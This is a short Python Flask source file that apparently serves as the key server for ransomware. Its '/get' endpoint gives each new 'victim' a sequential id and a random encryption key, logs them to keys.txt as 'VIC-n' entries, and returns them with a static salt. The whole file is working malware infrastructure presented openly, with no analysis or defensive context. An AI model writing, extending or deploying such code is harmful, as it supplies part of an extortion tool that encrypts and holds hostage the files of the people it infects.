from flask import Flask
import secrets

app = Flask(__name__)

keyFile = 'keys.txt'
staticSalt = '0202020202020202'

@app.route('/get')
def get():
    victimId = None
    victimKey = None

    try:
        victimId = num_lines = sum(1 for line in open(keyFile))
    except FileNotFoundError:
        victimId = 0

    victimKey = secrets.token_hex(16)

    keysFile = open(keyFile, 'a')
    keysFile.write('VIC-' + str(victimId) + ': ' + victimKey + '\n')
    keysFile.close()

    return {
        'i': victimId,
        'k': victimKey,
        's': staticSalt
    }
